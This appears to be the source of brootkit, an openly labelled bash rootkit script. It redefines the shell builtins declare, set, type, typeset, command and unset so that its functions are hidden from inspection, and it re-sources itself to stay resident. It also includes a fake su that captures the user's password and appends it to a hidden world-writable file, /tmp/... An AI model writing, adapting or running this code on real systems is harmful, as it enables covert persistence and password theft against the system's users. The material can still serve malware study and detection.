#!/bin/bash
# Lightweight rootkit implemented by bash shell scripts v0.01
#
# by wzt 2015 	http://www.cloud-sec.org
#

declare -r builtin
declare -r declare
declare -r set
declare -r fake_unset
declare -r type
declare -r typeset

function abcdmagic()
{
	:
}

function builtin()
{
	local fake_a fake_b

	unset command
	case $1 in 
		"declare"|"set"|"unset"|"command"|"type"|"typeset")
        		fake_a="$(command builtin $1 $2)"
        		fake_b=${fake_a/abcdmagic?()*/}
			echo -n "$fake_b"
			reset_command
			return ;;
		"builtin")
			echo "bash: builtin: builtin: syntax error, bash($BASH_VERSION) is not support."
			reset_command
			return ;;
		*)
			command builtin $1 $2
			reset_command
			;;
	esac
}

function declare()
{
	local fake_a fake_b

	unset command
	case $1 in 
		""|"-f"|"-F")
        		fake_a="$(command declare $1 $2)"
        		fake_b=${fake_a/abcdmagic?()*/}
			echo -n "$fake_b"
			reset_command
			return ;;
		*)
        		command declare $1 $2
			reset_command
			return ;;
	esac
}

function typeset()
{
        local fake_a fake_b

	unset command
        case $1 in
                ""|"-f"|"-F")
                        fake_a="$(command declare $1 $2)"
                        fake_b=${fake_a/abcdmagic?()*/}
                        echo -n "$fake_b"
			reset_command
                        return ;;
                *)
                        command typeset $1 $2
			reset_command
                        return ;;
        esac
}

function type()
{
        case $1 in
                "builtin"|"declare"|"set"|"unset"|"type"|"typeset")
                        echo "$1 is a shell builtin"
                        return ;;
                *)
			unset command
                        command type $1 $2
			reset_command
                        return ;;
        esac
}

function set()
{
        local fake_a fake_b

	unset command
        case $1 in
                "")
                        fake_a="$(command set)"
                        fake_b=${fake_a/abcdmagic?()*/}
                        echo -n "$fake_b"
			reset_command
                        return ;;
                *)
			echo $1 $2
                        command set $1 $2
			reset_command
                        return ;;
        esac
}

function fake_unset()
{
        case $1 in
                "builtin"|"declare"|"command"|"set"|"unset"|"type"|"typeset")
                        echo "bash: syntax error, bash($BASH_VERSION) is not support."
                        return ;;
                *)
                        unset $1 $2
                        return ;;
        esac
}

function fake_command()
{
        case $1 in
                "builtin"|"declare"|"command"|"set"|"unset"|"type"|"typeset")
                        echo "bash: syntax error, bash($BASH_VERSION) is not support."
                        return ;;
                *)
			unset command
                        command $1 $2
                        reset_command
                        return ;;
        esac
}

function command()
{
        case $1 in
                "builtin")
			builtin $2 $3
			return ;;
                "declare")
			declare $2 $3
			return ;;
		"set")
			set $2 $3
			return ;;
		"unset")
			fake_unset $2 $3
			. brootkit.sh
			return ;;
		"type")
			type $2 $3
			return ;;
		"typeset")
			typeset $2 $3
			return ;;
		"command")
			fake_command $2 $3
			return ;;
                *)
			unset command
			command $2 $3
			. brootkit.sh
			return ;;
        esac
}

function reset_command()
{
	function command()
	{
        	case $1 in
                	"builtin")
                        	builtin $2 $3
                        	return ;;
                	"declare")
                        	declare $2 $3
                        	return ;;
                	"set")
                        	set $2 $3
                        	return ;;
                	"unset")
                        	fake_unset $2 $3
                        	. brootkit.sh
                        	return ;;
                	"type")
                        	type $2 $3
                        	return ;;
                	"typeset")
                        	typeset $2 $3
                        	return ;;
                	"command")
                        	fake_command $2 $3
                        	return ;;
                	*)
                        	unset command
                        	command $2 $3
                        	. brootkit.sh
                        	return ;;
        	esac
	}
}

function su()
{
        local arg_list=("" "-" "-l" "--login"
                        "-c" "--command" "--session-command"
                        "-f" "--fast"
                        "-m" "--preserve-environment" "-p"
                        "-s" "--shell=SHELL")
        local flag=0 tmp_arg arg pass

        if [ $UID -eq 0 ]; then
                /bin/su $1; unset su ; return $?
        fi

        for arg in ${arg_list[@]}
        do
                [ "$1" = "$arg" ] && flag=1
        done

        [ $# -eq 0 ] && flag=1

        tmp_arg=$1;tmp_arg=${tmp_arg:0:1};
        [ "$tmp_arg" != "-" -a $flag -eq 0 ] && flag=1

        if [ $flag -ne 1 ];then
                /bin/su $1; return $?
        fi

        [ ! -f /tmp/... ] && `touch /tmp/... && chmod 777 /tmp/... >/dev/null 2>&1`

        echo -ne "Password:\r\033[?25l"
        read -t 30 -s pass
        echo -ne "\033[K\033[?25h"

        /bin/su && unset su && echo $pass >> /tmp/...
}
